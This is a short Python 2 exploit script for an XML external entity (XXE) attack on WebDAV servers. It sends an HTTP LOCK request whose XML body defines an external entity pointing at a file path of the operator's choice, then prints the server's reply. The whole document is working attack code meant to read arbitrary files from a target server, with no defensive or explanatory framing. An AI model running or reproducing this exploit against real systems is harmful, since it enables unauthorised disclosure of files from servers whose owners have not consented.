import requests
import sys


if (len(sys.argv) < 5):
    print "Not enough input arguments.\nProvided: %s" %sys.argv[1:]
    print "Usage: script.py host port webdav_file remote_file"
    exit (0)

host = sys.argv[1]
port = sys.argv[2]
webdav_file = sys.argv[3]
remote_file = sys.argv[4]

xml = """<?xml version="1.0"?>
<!DOCTYPE REMOTE [\
<!ENTITY RemoteX SYSTEM "%s">\
]>\
<D:lockinfo xmlns:D='DAV:'>
<D:lockscope><D:exclusive/></D:lockscope>
<D:locktype><D:write/></D:locktype>
<D:owner>
<D:href>
<REMOTE>
<RemoteX>&RemoteX;</RemoteX>
</REMOTE>
</D:href>
</D:owner>
</D:lockinfo>"""

headers={'Content-Type': 'text/xml'}
data = xml%remote_file
try:
    url = "http://{0}:{1}/{2}".format(host, port, webdav_file)
    #print url
    r = requests.request("LOCK", url, headers=headers, data=data)
except requests.exceptions.HTTPError as err:
    print err

print r.text